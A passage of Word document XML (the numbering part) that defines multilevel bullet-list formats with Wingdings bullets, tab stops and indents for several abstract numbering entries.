      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="8B6ACBEC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="76">
    <w:nsid w:val="2DCB0775"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6CDA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2EBB71F9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3B62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2EDB53A5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3D2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EFA5A0F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8D380E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F0332D6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1384101A"/>
    <w:lvl w:ilvl="0" w:tplc="FB8A9AEE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="11B00696" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="E28473A8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="6B88DB16" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="7452E0A4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="938AB602" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="F528BEC8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="822C56A2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="DE1A4AE2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="81">
    <w:nsid w:val="2F40607B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="480C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FBD251F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="871C9C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0281F1D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A066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0545389"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DB16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06F5A23"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9A0C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13752B7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1206DC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23A1533"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E2EE4DBE"/>
    <w:lvl w:ilvl="0" w:tplc="FF7C05B8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="C9C663D4">
      <w:start w:val="5572"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="19681258" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="F7541B28" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="1474F444" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="57DC1B04" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="ED5220AE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="3212354C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="3214731A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="88">
    <w:nsid w:val="341F46E6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="75D4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346B3B89"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5E92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5110D30"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3C2831A4"/>
    <w:lvl w:ilvl="0" w:tplc="BCA45624">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="F9E4578C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="F86CE6C8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="4ACA8672" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="4DA89B8A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="9A2C2920" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="063A5A00" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0CA69A72" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="87FEB7E4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="91">
    <w:nsid w:val="361D22B0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F282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37723FA1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="881E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7BC73A4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="79AC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85C66E3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DEBC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89B5C36"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8370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39AE19E9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5EEC1A0A"/>
    <w:lvl w:ilvl="0" w:tplc="6F465AB4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0094A078" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="95E86A9A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="335E1BD4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="F59E3BC8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="E54AC5A8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="43B83FE4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="9E70E010" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="43906626" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="97">
    <w:nsid w:val="3A215209"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B40E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A3F3379"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F26E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3A436754"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BEC0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A5B040B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B7D4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A836460"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1720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BBE2938"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0A46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C972184"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DB5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CBB05FE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="26F4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D65171A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0976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3E7E1688"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0A18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3F002143"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7E2E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3F0905A0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="053C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3F21291B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="79B2220A"/>
    <w:lvl w:ilvl="0" w:tplc="5B462282">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="22BCD7EC">
      <w:start w:val="4430"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="07F48F3C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="645EC08A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="E7C2BE0E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="CF8E2AEC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="2A1AA416" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="4B103D74" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="194E10C2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="110">
    <w:nsid w:val="3FD761BB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3762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06E6ACA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0DA6F6A0"/>
    <w:lvl w:ilvl="0" w:tplc="ECD402EE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="BD784F40" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A63AAC92" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="ED66F3E6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
